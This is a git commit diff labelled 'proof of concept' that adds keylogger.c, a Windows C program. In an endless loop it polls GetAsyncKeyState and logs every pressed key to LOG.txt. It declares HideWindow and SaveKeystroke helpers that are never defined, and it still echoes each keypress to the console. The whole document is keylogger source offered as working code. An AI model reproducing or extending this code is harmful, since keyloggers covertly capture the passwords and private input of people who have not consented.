9255ce23b26107f6fce08a09902095cfccffd0dc
Logan Scott <loganscott.lgs@gmail.com>
2022-04-20 12:25:50 -0400

    proof of concept

--- keylogger.c
+++ keylogger.c
@@ -1,1 +1,31 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
 
+// FUNCTION DEFINITIONS //
+void HideWindow();
+void SaveKeystroke();
+
+// MAIN FUNCTION //
+int main(){
+    FILE* logfile;
+    logfile = fopen("LOG.txt", "w");
+    while(1){
+        
+        // loop thru all keyboard characters not including ASCII extended characters
+        for(char key = 8; key <= 126; key++){
+            
+            // check for key press
+            // where -32767 means key is pressed
+            // and 0 means key is not pressed
+            if(GetAsyncKeyState(key) == -32767){
+                printf("You pressed a key! ");
+                fprintf(logfile, "%c \n", key);
+            }
+        }
+    }
+    fclose(logfile);
+    return 0;
+}
+
+// HELPER FUNCTIONS //
